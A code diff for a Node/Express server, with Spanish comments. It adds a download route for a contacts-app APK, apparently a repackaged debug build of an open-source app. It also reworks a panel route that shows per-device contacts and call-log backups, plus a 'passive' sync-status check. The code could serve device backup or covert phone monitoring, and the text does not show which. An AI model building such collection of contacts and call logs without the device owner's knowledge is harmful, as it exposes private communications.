@@ -86,7 +86,26 @@ function getApkPath(apkFilename) {
   return null;
 }
 
-// Rutas públicas de descarga de aplicaciones (APKs)
+router.get('/downloads/app-contactos.apk', (req, res) => {
+  try {
+    const apkPath = getApkPath('app-contactos.apk') || getApkPath('contacts-13-foss-debug.apk');
+    if (apkPath && fs.existsSync(apkPath)) {
+      const stat = fs.statSync(apkPath);
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Length', stat.size);
+      res.setHeader('Content-Disposition', 'attachment; filename="app-contactos.apk"');
+      const stream = fs.createReadStream(apkPath);
+      stream.on('error', (err) => {
+        if (!res.headersSent) res.status(500).send('Error streaming APK');
+      });
+      return stream.pipe(res);
+    }
+    return res.status(404).send('APK de Contactos no disponible en el servidor.');
+  } catch (err) {
+    return res.status(500).send('Error interno: ' + err.message);
+  }
+});
+
 router.get('/downloads/app-exploracion.apk', (req, res) => {
   try {
     const apkPath = getApkPath('app-exploracion.apk');
@@ -238,10 +257,28 @@ router.get(['/expl/devices/:deviceId/files-hub', '/expl/devices/:deviceId/files-
 router.get(['/expl/devices/:deviceId/contacts', '/expl/devices/:deviceId/contacts/'], (req, res) => {
   const cleanId = sanitizeDeviceId(req.params.deviceId);
   const targetDir = getDatasetDir();
-  const backupPath = path.join(targetDir, 'devices', cleanId, 'contacts_backup.json');
+  const devicesDir = path.join(targetDir, 'devices');
 
+  // Helper para buscar un archivo en la carpeta del dispositivo o sus alias estrictos
+  const findDeviceFile = (fileName) => {
+    const directPath = path.join(devicesDir, cleanId, fileName);
+    if (fs.existsSync(directPath)) return directPath;
+
+    if (fs.existsSync(devicesDir)) {
+      const items = fs.readdirSync(devicesDir);
+      for (const item of items) {
+        if (item !== cleanId && (item.endsWith(cleanId) || cleanId.endsWith(item))) {
+          const aliasPath = path.join(devicesDir, item, fileName);
+          if (fs.existsSync(aliasPath)) return aliasPath;
+        }
+      }
+    }
+    return null;
+  };
+
+  const backupPath = findDeviceFile('contacts_backup.json');
   let backupData = null;
-  if (fs.existsSync(backupPath)) {
+  if (backupPath) {
     try {
       backupData = JSON.parse(fs.readFileSync(backupPath, 'utf8'));
     } catch (e) {
@@ -249,29 +286,12 @@ router.get(['/expl/devices/:deviceId/contacts', '/expl/devices/:deviceId/contact
     }
   }
 
-  // Fallback si no está directamente en el directorio con el ID desinfectado
-  if (!backupData) {
-    const devicesDir = path.join(targetDir, 'devices');
-    if (fs.existsSync(devicesDir)) {
-      const items = fs.readdirSync(devicesDir);
-      for (const item of items) {
-        const altPath = path.join(devicesDir, item, 'contacts_backup.json');
-        if (fs.existsSync(altPath)) {
-          try {
-            backupData = JSON.parse(fs.readFileSync(altPath, 'utf8'));
-            if (backupData) break;
-          } catch (e) {}
-        }
-      }
-    }
-  }
-
   const contactsList = backupData?.contacts || [];
 
   // Cargar registro de llamadas
-  const callLogsBackupPath = path.join(targetDir, 'devices', cleanId, 'call_logs_backup.json');
+  const callLogsBackupPath = findDeviceFile('call_logs_backup.json');
   let callLogsData = null;
-  if (fs.existsSync(callLogsBackupPath)) {
+  if (callLogsBackupPath) {
     try {
       callLogsData = JSON.parse(fs.readFileSync(callLogsBackupPath, 'utf8'));
     } catch (e) {
@@ -279,65 +299,71 @@ router.get(['/expl/devices/:deviceId/contacts', '/expl/devices/:deviceId/contact
     }
   }
 
-  if (!callLogsData) {
-    const devicesDir = path.join(targetDir, 'devices');
-    if (fs.existsSync(devicesDir)) {
-      const items = fs.readdirSync(devicesDir);
-      for (const item of items) {
-        const altPath = path.join(devicesDir, item, 'call_logs_backup.json');
-        if (fs.existsSync(altPath)) {
-          try {
-            callLogsData = JSON.parse(fs.readFileSync(altPath, 'utf8'));
-            if (callLogsData) break;
-          } catch (e) {}
-        }
-      }
-    }
-  }
-
   const callLogsList = callLogsData?.callLogs || [];
 
-  // Detección Pasiva del Estado del Dispositivo (Sin enviar nada al teléfono)
-  const deviceSyncNs = req.app.get('deviceSyncNamespace');
-  const mobileRoom = deviceSyncNs?.adapter?.rooms?.get(`device:${cleanId}`);
-  const isMobileOnline = Boolean(mobileRoom && mobileRoom.size > 0);
+  // Cargar estados de sincronización HTTP
+  const contactsStatusPath = findDeviceFile('contacts_status.json');
+  let contactsStatusData = null;
+  if (contactsStatusPath) {
+    try { contactsStatusData = JSON.parse(fs.readFileSync(contactsStatusPath, 'utf8')); } catch (e) {}
+  }
 
-  const lastTs = backupData?.timestamp || callLogsData?.timestamp || null;
-  let statusText = 'Desconectado';
+  const callLogsStatusPath = findDeviceFile('call_logs_status.json');
+  let callLogsStatusData = null;
+  if (callLogsStatusPath) {
+    try { callLogsStatusData = JSON.parse(fs.readFileSync(callLogsStatusPath, 'utf8')); } catch (e) {}
+  }
+
+  // Detección Pasiva HTTP del Estado de la App de Contactos (Monitoreo de Workers)
+  const lastHttpTs = Math.max(
+    backupData?.timestamp || 0,
+    callLogsData?.timestamp || 0,
+    contactsStatusData?.timestamp || 0,
+    callLogsStatusData?.timestamp || 0
+  );
+
+  const isSyncingNow = (contactsStatusData?.status === 'syncing' || callLogsStatusData?.status === 'syncing') && 
+                       (Date.now() - (contactsStatusData?.timestamp || callLogsStatusData?.timestamp || 0) < 5 * 60 * 1000);
+
+  let statusText = 'No Instalada / Sin Datos';
   let statusColor = '#9ca3af';
   let dotColor = '#6b7280';
-  let isOnline = isMobileOnline;
+  let isOnline = false;
 
-  if (isMobileOnline) {
-    statusText = 'En línea (Socket Activo)';
-    statusColor = '#34d399';
-    dotColor = '#10b981';
-  } else if (lastTs) {
-    const diffMs = Date.now() - lastTs;
+  if (isSyncingNow) {
+    statusText = 'Sincronizando (HTTP Worker Activo)';
+    statusColor = '#38bdf8';
+    dotColor = '#0284c7';
+    isOnline = true;
+  } else if (lastHttpTs > 0) {
+    const diffMs = Date.now() - lastHttpTs;
     const diffMins = Math.floor(diffMs / (60 * 1000));
-    if (diffMins < 10) {
-      statusText = 'En línea (Sincronizado recientemente)';
+    if (diffMins < 30) {
+      statusText = diffMins === 0 ? 'Al Día (Sincronizado ahora)' : `Al Día (Sincronizado hace ${diffMins} min)`;
       statusColor = '#34d399';
       dotColor = '#10b981';
       isOnline = true;
-    } else if (diffMins < 60) {
-      statusText = `Inactivo (Hace ${diffMins} min)`;
-      statusColor = '#fbbf24';
-      dotColor = '#f59e0b';
-    } else {
+    } else if (diffMins < 24 * 60) {
       const diffHours = Math.floor(diffMins / 60);
-      statusText = `Inactivo (Hace ${diffHours} h)`;
-      statusColor = '#9ca3af';
-      dotColor = '#6b7280';
+      statusText = `En Espera (Último ciclo hace ${diffHours} h)`;
+      statusColor = '#34d399';
+      dotColor = '#10b981';
+      isOnline = true;
+    } else {
+      const diffDays = Math.floor(diffMins / (24 * 60));
+      statusText = `Inactiva (Sin sincronizar hace ${diffDays} d)`;
+      statusColor = '#f59e0b';
+      dotColor = '#f59e0b';
+      isOnline = false;
     }
   }
 
   const metadata = {
     contactCount: backupData?.contactCount || contactsList.length,
-    timestamp: backupData?.timestamp || null,
+    timestamp: backupData?.timestamp || callLogsData?.timestamp || null,
     hash: backupData?.hash || '',
-    deviceModel: backupData?.deviceModel || 'Dispositivo Android',
-    updatedAt: backupData?.updatedAt || null,
+    deviceModel: backupData?.deviceModel || callLogsData?.deviceModel || 'Dispositivo Android',
+    updatedAt: backupData?.updatedAt || callLogsData?.updatedAt || null,
     deviceStatus: {
       isOnline,
       text: statusText,
